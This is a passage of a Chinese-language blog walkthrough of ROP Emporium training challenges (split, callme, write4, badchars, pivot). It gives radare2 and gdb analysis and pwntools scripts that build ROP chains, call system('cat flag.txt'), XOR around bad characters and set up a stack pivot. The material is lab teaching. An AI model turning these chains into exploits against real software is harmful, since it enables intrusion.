alt="image-20240210185518036"></p><p>将input作为输入运行</p><p><img src="/.io//image-20240210185618607.png" alt="image-20240210185618607"></p><p>然后pattern_search</p><p><img src="/.io//image-20240210185718675.png" alt="image-20240210185718675"></p><p>可以看到溢出rsp需要40个字节，我们可以尝试通过调用其他函数吗，比如usefulfunction?</p><p>我们回到r2反汇编usefulfunction</p><p>r2 -AAA .&#x2F;split</p><p><img src="/.io//image-20240210185813095.png" alt="image-20240210185813095"></p><p>我们可以看到它调用将执行&#x2F;bin&#x2F;ls的system()函数。</p><p>usefulFunction函数的地址是0x00400807，所以我们需要40个字节的随机数据和这个地址。</p><p>简单的使用python生成exp写入input</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c <span class="string">&#x27;from pwn import *;print(&quot;A&quot; * 40 +p64(0x00400807))&#x27;</span> &gt; input</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210190204377.png" alt="image-20240210190204377"></p><p>在gdb中运行测试</p><p><img src="/.io//image-20240210190304207.png" alt="image-20240210190304207"></p><p>可以看到成功执行了&#x2F;bin&#x2F;ls</p><p>不过我们的目标是打印flag，而不是ls，所以继续研究下去</p><p>回到r2中使用izz列出字符串</p><p><img src="/.io//image-20240210190357704.png" alt="image-20240210190357704"></p><p>可以打印flag的字符串</p><p>这个字符串的地址是0x0001060</p><p>现在我们尝试溢出栈，直接执行到system()</p><p>不过我们要找到一个办法，直接将这个地址传入RDI寄存器（x86-64传参时依次通过rdi,rsi，，，传参，rdi是第一个）</p><p>这时候我们就需要ROPgadget了，简单地说，它们就是写以ret指令结尾的指令序列。指定–only来筛选</p><p><img src="/.io//image-20240210190542872.png" alt="image-20240210190542872"></p><p>找到了很多gadget，那么哪个符合要求呢</p><p>我们前面提到必须将值传入RDI，所以要找到pop rdi</p><p>所以符合要求的是地址是0x400883</p><p>我们传递这个gadget地址（0x400883）后，它会把栈中下一个值传到RDI寄存器中，所以下一个地址应该是能够打印flag的字符串的地址(0x601060)，最后是system（）函数的地址（0x400810）</p><p>使用python简单地将exp输出到input</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c <span class="string">&#x27;from pwn import *;print(&quot;A&quot; * 40+p64(0x0400883) + p64(0x00601060)+p64(0x00400810))&#x27;</span> &gt; input</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210190753596.png" alt="image-20240210190753596"></p><p>在gdb中查看，发现确实输出了flag。</p><p>同样也可以通过pwntools快速写一个exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./split&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./split&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400883</span></span><br><span class="line">cat_flag_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h1><p>首先看一下二进制文件的信息 rabin -I callme</p><p><img src="/.io//image-20240210192602291.png" alt="image-20240210192602291"></p><p>可以看到nx为true，同样设置了栈不可执行</p><p>接下来在r2中加载分析</p><p>r2 -AAA callme</p><p><img src="/.io//image-20240210192645399.png" alt="image-20240210192645399"></p><p>afl列出函数</p><p><img src="/.io//image-20240210192707315.png" alt="image-20240210192707315"></p><p>在上图中看到了此前出现过的main,pwnem,usefulFunction,不过这里比较有意思的是还出现了callme_one,callme_two,callme_three</p><p>我们看看题目的描述</p><p><img src="/.io//image-20240210192725380.png" alt="image-20240210192725380"></p><p>我们知道需要通过对应的顺序传入对应的参数才能得到flag</p><p>即：</p><p>callme_one(1,2,3),callme_two(1,2,3),callme_three(1,2,3)</p><p>每个函数都有三个参数</p><p>在进一步分析他们之前，我们先来看看main</p><p><img src="/.io//image-20240210192750115.png" alt="image-20240210192750115"></p><p>在上图中可以看到还是调用了pwnme。</p><p>我们跟着分析pwnme，看看buffer的大小是否还是一样</p><p>pdf @ sym.pwnme</p><p><img src="/.io//image-20240210223302835.png" alt="image-20240210223302835"></p><p>可以看到缓冲区大小还是32字节，fgets函数容易造成缓冲区溢出</p><p>再看看usefulFunction中有什么</p><p>pdf @ sym.usefulFunction</p><p><img src="/.io//image-20240210223343377.png" alt="image-20240210223343377"></p><p>从上图中可以看到是按照给出的参数、顺序来调用callme_1,2,3三个函数的</p><p>所以我们在写的exp时的依据就是这个</p><p>需要注意的是，<strong>传参时顺序是相反的</strong></p><p>我们可以在这个网站（<a href="https://godbolt.org/%EF%BC%89%E8%87%AA%E5%B7%B1%E5%86%99%E4%B8%80%E6%AE%B5%E7%AE%80%E5%8D%95%E7%9A%84%E5%87%BD%E6%95%B0%E5%B9%B6%E4%B8%94%E5%9C%A8main%E4%B8%AD%E8%B0%83%E7%94%A8%EF%BC%8C%E5%AF%B9%E7%85%A7%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90">https://godbolt.org/）自己写一段简单的函数并且在main中调用，对照汇编分析</a></p><p><img src="/.io//image-20240210223414686.png" alt="image-20240210223414686"></p><p>为了将值放入用于传递参数的寄存器中，我们还要用到rop gadget，用于将值从栈pop到这些寄存器中</p><p>ROPgadget –binary callme</p><p><img src="/.io//image-20240210223909137.png" alt="image-20240210223909137"></p><p>在0x401ab0,这个gadget可以将值从栈上pop到对应的三个寄存器上</p><p>这部分的exp比较长，我们直接用pwntools写，关键是四个地址，一个是rop gadget，已经知道了，另外三个是callme_1,2,3的地址，分别如下</p><p><img src="/.io//image-20240210224010629.png" alt="image-20240210224010629"></p><p>照用以前的框架。使用pwntools进行编写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_arguments</span>(<span class="params">payload</span>):</span><br><span class="line">    payload += p64(<span class="number">0x0000000000401ab0</span>) <span class="comment"># Address of gadget pop rdi; pop rsi; pop rdx; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)</span><br><span class="line">    payload += p64(<span class="number">0x2</span>)</span><br><span class="line">    payload += p64(<span class="number">0x3</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">offset = cyclic(<span class="number">40</span>) <span class="comment"># 40 bytes used to overflow.</span></span><br><span class="line">payload = offset</span><br><span class="line">payload = add_arguments(payload)</span><br><span class="line">payload += p64(<span class="number">0x00401850</span>) <span class="comment"># Address of callme_one function.</span></span><br><span class="line">payload = add_arguments(payload)</span><br><span class="line">payload += p64(<span class="number">0x00401870</span>) <span class="comment"># Address of callme_two function.</span></span><br><span class="line">payload = add_arguments(payload)</span><br><span class="line">payload += p64(<span class="number">0x00401810</span>) <span class="comment"># Address of callme_three function.</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;callme&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">output = sh.recvall()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><p>运行python文件，取得flag。</p><p><img src="/.io//image-20240210224244081.png" alt="image-20240210224244081"></p><h1 id="Write4"><a href="#Write4" class="headerlink" title="Write4"></a>Write4</h1><p>  先通过rabin2 看一下基础的文件信息</p><p>   rabin2 -I write4</p><p><img src="/.io//image-20240211000437665.png" alt="image-20240211000437665"></p><p>被设置了nx。也可以用 r2 -AAA .&#x2F;write4后用i~nx来筛选查看。</p><p>在前面的实验中当我们需要打印flag时，用的是文件自身的字符串，我们看看这题里有没有，直接使用strings配合grep过滤</p><p>strings write4 | grep ‘cat flag.txt’</p><p><img src="/.io//image-20240211000554367.png" alt="image-20240211000554367"></p><p>可以看到，这种字符串是不存在的</p><p>接下来先看看涉及的函数 r2 -AAA .&#x2F;write4</p><p>afl</p><p><img src="/.io//image-20240211000655805.png" alt="image-20240211000655805"></p><p>   看看usefulFunction里会不会有我们需要的信息，反汇编它</p><p>   pdf @ sym.usefulFunction</p><p><img src="/.io//image-20240211000719714.png" alt="image-20240211000719714"></p><p>在上图中我们看到，我们调用了system(),不过传给system的是&#x2F;bin&#x2F;ls，也就是说会执行ls命令</p><p>   不过我们想执行的是cat flag.txt的命令，因为二进制文件中不存在这种字符串，所以我们需要手动进行。</p><p>   首先需要考虑的是，把cat flag.txt写到哪个地址</p><p>   readelf -a write4</p><p><img src="/.io//image-20240211000818999.png" alt="image-20240211000818999"></p><p> 我们关注输出的sectionheaders部分。</p><p>可以看到打印出一系列的section，我们需要在其中找到一个合适的，在其中我们可以写入值。</p><p><img src="/.io//image-20240211000849916.png" alt="image-20240211000849916"></p><p>一般我们都会选择写到data，上图中找到了一个data,地址是0x601050，我们使用readelf看看在这个section里有没有什么数据</p><p>   readelf -x .data write4</p><p><img src="/.io//image-20240211000926022.png" alt="image-20240211000926022"></p><p>可以看到这个地址是空的，所以我们写入这里是ok的</p><p>接下来我们还是需要ropgadget找到特定的gadget让我们能够将字符串放入这儿</p><p>   ROPgadget –binary write4，结合–only或grep进行筛选。</p><p>这里打印出了很多gadget，那么我们需要怎样的呢</p><p>   首先这个gadget要能够将值写入内存地址，在汇编中一般是通过mov体现，比如MOV [r0],r1这样子，这条汇编的意思是将值从寄存器R1移动到寄存器R0所保存的内存地址处。</p><p>   下图红色选中的就符合要求</p><p><img src="/.io//image-20240211001304191.png" alt="image-20240211001304191"></p><p>地址是0x400820</p><p>现在我们可以将值写入内存了，但是我们还需要pop，才能将值写入寄存器中</p><p><img src="/.io//image-20240211001401339.png" alt="image-20240211001401339"></p><p>地址为0x400890</p><p>我们还需要返回并获取system（）的地址，并且为了将字符串的地址作为调用system（）时的参数，还需要pop rdi</p><p><img src="/.io//image-20240211001510276.png" alt="image-20240211001510276"></p><p> 地址是0x400893</p><p>   现在关键的地址都有了，可以编写我们的exp了</p><p>   关键点包括：</p><p>   使用pop gadget将字符串的地址和字符串放在寄存器中</p><p>   使用mov gadget将字符串放入给出的内存地址中</p><p>   使用pop rdi gadget将字符串的地址放入寄存器</p><p>   调用system（），它使用已经保存了字符串地址的rdi寄存器作为参数寄存器</p><p>   完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">place_string_at_address</span>(<span class="params">mov_gadget_address, pop_gadget_address, string_address, string</span>):</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">while</span> <span class="built_in">len</span>(string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">          string += <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">     splitted_string = [string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string), <span class="number">8</span>)]</span><br><span class="line">     payload = <span class="string">&quot;&quot;</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(splitted_string)):</span><br><span class="line">        </span><br><span class="line">          <span class="comment"># Place the gadgets into the payload.</span></span><br><span class="line">          payload += p64(pop_gadget_address)</span><br><span class="line">          payload += p64(string_address + (i * <span class="number">8</span>)) </span><br><span class="line">                                                   </span><br><span class="line">          payload += splitted_string[i]</span><br><span class="line">          payload += p64(mov_gadget_address)</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 40 bytes of random data.</span></span><br><span class="line">offset = <span class="string">&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line"></span><br><span class="line">offset += place_string_at_address(<span class="number">0x400820</span>, <span class="number">0x400890</span>, <span class="number">0x601050</span>, <span class="string">&quot;cat flag.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset += p64(<span class="number">0x0000000000400893</span>) <span class="comment"># Address of pop rdi</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000601050</span>) <span class="comment"># Address of string</span></span><br><span class="line">offset += p64(<span class="number">0x00400810</span>)         <span class="comment"># Address of system()</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(offset)</span><br></pre></td></tr></table></figure><p>python 4.py | .&#x2F;write4，运行后如图,拿到了flag</p><p><img src="/.io//image-20240211001656537.png" alt="image-20240211001656537"></p><h1 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h1><p> 先使用rabin2 -I看一下基础的信息</p><p>rabin2 -I badchars</p><p><img src="/.io//image-20240211003924255.png" alt="image-20240211003924255"></p><p>通过r2加载调试分析，afl查看函数</p><p>r2 -AAA .&#x2F;badchars</p><p>afl</p><p><img src="/.io//image-20240211004032164.png" alt="image-20240211004032164"></p><p>可以看到在usefulFunction后还有两个函数，分别是nstrlen,checkBadchars</p><p>结合题目的提示</p><p><img src="/.io//image-20240211004053853.png" alt="image-20240211004053853"></p><p>这函数应该是用于检查exp中是否有坏字符的</p><p>直接运行badchars,就可以看到坏字符了</p><p>.&#x2F;badchars</p><p><img src="/.io//image-20240211004123319.png" alt="image-20240211004123319"></p><p>这些就是我们这次在开发exp时需要避免的</p><p>还是和以前一样，看看关键函数的反汇编</p><p>pdf @ sym.pwnme</p><p><img src="/.io//image-20240211004218040.png" alt="image-20240211004218040"></p><p><img src="/.io//image-20240211004309701.png" alt="image-20240211004309701"></p><p><img src="/.io//image-20240211004340838.png" alt="image-20240211004340838"></p><p> 可以看到在pwnme函数中已经给出了坏字符，同时还调用了新的两个函数以及fgets（）</p><p>再看看usefulFunction</p><p>pdf @ sym.usefulFunction</p><p><img src="/.io//image-20240211004423204.png" alt="image-20240211004423204"></p><p> 和前面的关卡一样，也是调用了system，执行ls命令</p><p>接下来我们通过gdb分析得到覆盖rsp寄存器的偏移</p><p>pattern_create 512 input</p><p><img src="/.io//image-20240211004537938.png" alt="image-20240211004537938"></p><p>pattern_search</p><p><img src="/.io//image-20240211004640814.png" alt="image-20240211004640814"></p><p>可以看到输入40字节后将会覆盖rsp</p><p>回到坏字符的话题来，我们在写exp时用的是十六进制，所以先将这些坏字符转为16进制</p><p><img src="/.io//image-20240211004732155.png" alt="image-20240211004732155"></p><p> 另外，空格为</p><p><img src="/.io//image-20240211004757138.png" alt="image-20240211004757138"></p><p>因此，坏字符的16进制分别是</p><p>0x62 0x69 0x63 0x2f 0x20 0x66 0x6e 0x73</p><p>在使用ROPgadget时通过–badbytes即可过滤掉包含坏字符的项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary badchars --badbytes <span class="string">&quot;62|69|63|2f|20|66|6e|73&quot;</span></span><br></pre></td></tr></table></figure><p>接下来的任务和上一关就一样了，显示找到mov…ret的，然后找对应的pop</p><p><img src="/.io//image-20240211005013135.png" alt="image-20240211005013135"></p><p>地址为0x400b34,0x400b3b</p><p>不过因为坏字符的原因，我们无法直接写入cat flag.txt</p><p><strong>这时候常用的解决办法是异或</strong></p><p>先找到xor的gadget</p><p><img src="/.io//image-20240211005052726.png" alt="image-20240211005052726"></p><p>通过这个gadget我们可以将r14寄存器的值与内存中的值进行异或</p><p>所以我们的思路就来了：</p><p>   我们强行凑对，我们的字符串不直接写cat flag.txt，而是用其他字符代替，这些字符与另外的特定字符异或后会得到cat flag.txt，这样就绕过了坏字符不允许我们直接传入cat flag.txt 的限制</p><p>   以首字母c为例，哪些字符异或后可以得到c呢？</p><p>   我们写一个简单的python脚本跑一下就知道了</p><p>   完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.printable:</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ y) == <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(x + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(y))</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240211005207868.png" alt="image-20240211005207868"></p><p>因为c是坏字符，这样的话我们就可以用a代替c然后与2异或，从而得到c</p><p>   这样就解决了坏字符的限制</p><p>   现在可以写exp了，关键点包括:</p><p>   1）用aat!alag.txt代替cat flag.txt</p><p>   2）使用pop gadgets来pop字符串中受限制字符的地址和对应的字符异或，从而得到所需的字符</p><p>   3）为所有被替换了的字符做相应的操作</p><p>   4）使用pop，将字符串的地址写入rdi寄存器</p><p>   5）调用system（）最后得到flag</p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">place_string_at_address</span>(<span class="params">mov_gadget_address, pop_gadget_address, string_address, string</span>):  </span><br><span class="line">     <span class="keyword">while</span> <span class="built_in">len</span>(string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">          string += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">        </span><br><span class="line">     splitted_string = [string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string), <span class="number">8</span>)]</span><br><span class="line">     payload = <span class="string">&quot;&quot;</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(splitted_string)):</span><br><span class="line">          <span class="comment"># Place the gadgets into the payload.</span></span><br><span class="line">          payload += p64(pop_gadget_address)</span><br><span class="line">          payload += splitted_string[i]</span><br><span class="line">          payload += p64(string_address + (i * <span class="number">8</span>)) </span><br><span class="line">          payload += p64(mov_gadget_address)</span><br><span class="line">            </span><br><span class="line">      <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">offset = <span class="string">&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">offset += place_string_at_address(<span class="number">0x400b34</span>, <span class="number">0x400b3b</span>, <span class="number">0x601071</span>, <span class="string">&quot;aat!alag.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now we&#x27;re XORing values from string.</span></span><br><span class="line"><span class="comment"># 2 ^ &#x27;a&#x27; = &#x27;c&#x27; </span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b40</span>)<span class="comment"># pop r14; pop r15; ret</span></span><br><span class="line">offset += p64(<span class="number">0x2</span>)</span><br><span class="line">offset += p64(<span class="number">0x601071</span>)<span class="comment"># 字符位置</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 ^ &#x27;!&#x27; = &#x27; &#x27;</span></span><br><span class="line"><span class="comment"># String address is 0x601071 because if we would have 0x601070</span></span><br><span class="line"><span class="comment"># address of second XORed character would end with 0x73, which</span></span><br><span class="line"><span class="comment"># is restricted.</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b40</span>)</span><br><span class="line">offset += p64(<span class="number">0x1</span>)</span><br><span class="line">offset += p64(<span class="number">0x601074</span>)</span><br><span class="line">offset += p64(<span class="number">0x0000000000400b30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 ^ &#x27;a&#x27; = &#x27;f&#x27;</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b40</span>)</span><br><span class="line">offset += p64(<span class="number">0x7</span>)</span><br><span class="line">offset += p64(<span class="number">0x601075</span>)</span><br><span class="line">offset += p64(<span class="number">0x0000000000400b30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pop address of string into RDI and call system()</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b39</span>)<span class="comment"># pop rdi; ret</span></span><br><span class="line">offset += p64(<span class="number">0x601071</span>)</span><br><span class="line">offset += p64(<span class="number">0x004009e8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(offset)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240211005709606.png" alt="image-20240211005709606"></p><h1 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h1><h2 id="Got表和PLT表"><a href="#Got表和PLT表" class="headerlink" title="Got表和PLT表"></a>Got表和PLT表</h2><p>操作系统通常使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。而且现代操作系统不允许修改代码段，只能修改数据段，那么GOT表与PLT表就应运而生。</p><p><img src="/.io//v2-6e9fb0ce3601c12321b123a02db4f352_r.jpg" alt="img"></p><p>当函数第一次被用到时才进行绑定(符号査找、重定位等),如果没有用到则不进行绑定。</p><p>为了提到cpude效率，在程序加载时并不会解析所有函数，而是在某个函数被调用时通过plt和got来对函数解析，然后将获得的函数地址放在got中，下一次调用就会直接使用got中的函数地址来对函数进行调用。</p><p><a href="https://blog.csdn.net/farmwang/article/details/73556017">GOT与PLT_got.plt-CSDN博客</a></p><h2 id="pivot-1"><a href="#pivot-1" class="headerlink" title="pivot"></a>pivot</h2><p>首先看一下基本信息</p><p>   rabin2 -I pivot</p><p><img src="/.io//image-20240211012551177.png" alt="image-20240211012551177"></p><p>   r2 -AAA .&#x2F;pivot；afl</p><p><img src="/.io//image-20240211012633326.png" alt="image-20240211012633326"></p><p>   先看看pwnme</p><p>   pdf @ sym.pwnme</p><p><img src="/.io//image-20240211012731487.png" alt="image-20240211012731487"></p><p>在上图中可以看到我们的exp应该需要两个chain</p><p>   同时告诉我们从libpivot.so调用了ret2win()</p><p>   再来看看uselessFunction  </p><p>   pdf @ sym.uselessFunction</p><p><img src="/.io//image-20240211012759516.png" alt="image-20240211012759516"></p><p>可以看到调用了foothold_function,但是其自身没有被调用</p><p>   接下来看看libpivot.so</p><p>   r2 -AAA libpivot.so；afl</p><p><img src="/.io//image-20240211012852356.png" alt="image-20240211012852356"></p><p> pdf @sym.ret2win</p><p><img src="/.io//image-20240211012925603.png" alt="image-20240211012925603"></p><p> 可以看到ret2win会打印flag</p><p>从题目的说明中</p><p><img src="/.io//image-20240211012945794.png" alt="image-20240211012945794"></p><p>我们知道栈空间被限制了，但是我们具体可以放多少空间呢?</p><p>使用gdb进行分析</p><p>gdb .&#x2F;pivot 输入r运行，然后第一次输入a，第二次输入一串A</p><p><img src="/.io//image-20240211013143258.png" alt="image-20240211013143258"></p><p>看一下rsp的情况</p><p><img src="/.io//image-20240211013251475.png" alt="image-20240211013251475"></p><p> 可以看到一共是3个qword，即3个八字节</p><p>   我们的任务就是通过这些空间，以某种方式把我们的空间pivot到一个更大的空间</p><p>   我们注意到，在运行的时候，程序会打印出一个缓冲区的地址，这就是第一个fgets使用的。我们可以改变指向那个缓冲区的rsp寄存器的值，这个值将是我们ROPchain的第二段</p><p>   我们先ropgadget看看可用的gadget</p><p>   ROPgadget –binary pivot</p><p><img src="/.io//image-20240211013426327.png" alt="image-20240211013426327"></p><p>我们可以使用pop rax,ret，然后将缓冲区的地址放在第二个位置上，最后xchg rax,rsp,交换值</p><p>这是第一段rop chain</p><p>接下来我们要解决的是由于ASLR机制，我们该如何得到ret2win函数的地址</p><p>由于plt表与got表的特性，函数第一次调用时plt表指向的got表中存储的执行在plt表中查找函数真实地址的函数地址，查找到函数真实地址后，存储到got表的原来表项中替换掉查找函数的指向地址。以题目为例， foothold_function函数，先调用利用利用plt表中的地址调用一次后，在plot表中会存储其真实地址，利用foothold_function函数与ret2win函数在libpivot32.so的便宜差，通过foothold_function真实地址，计算出ret2win函数的真实地址。</p><p>我们可以在pivot32的二进制找到foothold_function的plt和got表项，还可以在libpivot32.so找到ret2win这个函数。</p><p>因此解决办法是计算相对于foothold_function的偏移，然后在第二段中加上计算出来的值就可以了</p><p>回到r2分析libpivot.so分析时得到的地址</p><p><img src="/.io//image-20240211013552758.png" alt="image-20240211013552758"></p><p> 计算偏移为0x14e</p><p>然后我们要知道foothold_function在plt,got中的偏移</p><p>r2 -AAA .&#x2F;pivot</p><p><img src="/.io//image-20240211013656302.png" alt="image-20240211013656302"></p><p>ir</p><p><img src="/.io//image-20240211013719380.png" alt="image-20240211013719380"></p><p>地址是0x602048</p><p>这样写第二段ropchain的准备工作也完成了</p><p>关键部分在于：</p><p>   首先调用foothold_function来填充.got.plt</p><p>   pop foothold_function的got到rax寄存器</p><p>   向rax中添加偏移得到ret2win的</p><p>   最后进行调用即可</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gadgets</span></span><br><span class="line"></span><br><span 